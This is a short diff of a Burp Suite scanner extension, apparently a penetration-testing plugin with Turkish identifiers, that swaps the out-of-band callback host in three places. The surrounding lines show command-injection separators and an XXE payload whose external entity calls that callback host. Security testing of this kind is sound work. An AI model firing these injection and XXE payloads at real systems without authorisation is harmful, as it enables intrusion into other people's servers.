@@ -1103,7 +1103,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	
 	
 	anahtar=self.randomString(19)
-	anahtar_ana="http://0x94tr.atwebpages.com/0x94.php?"+anahtar
+	anahtar_ana="http://demowebsitesi.xyz/0x94/0x94.php?"+anahtar
 	
 	
 	postgetdict={}
@@ -1154,7 +1154,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";","@","&","?@"]
 	cmdhal={}
 	anahtar=self.randomString(19)
-	anahtar_ana="http://0x94tr.atwebpages.com/0x94.php?"+anahtar
+	anahtar_ana="http://demowebsitesi.xyz/0x94/0x94.php?"+anahtar
 	
 	for sep in seperators:
 	    try:
@@ -2170,7 +2170,7 @@ class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController,
 	rastgelekaptan = random.randint(0, 9999997)
 	
 	anahtar=self.randomString(19)
-	anahtar_ana="http://0x94tr.atwebpages.com/0x94.php?"+anahtar
+	anahtar_ana="http://demowebsitesi.xyz/0x94/0x94.php?"+anahtar
 	
 	
 	inject_key = '<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "'+anahtar_ana+'"> %ext;]><r></r>\n'
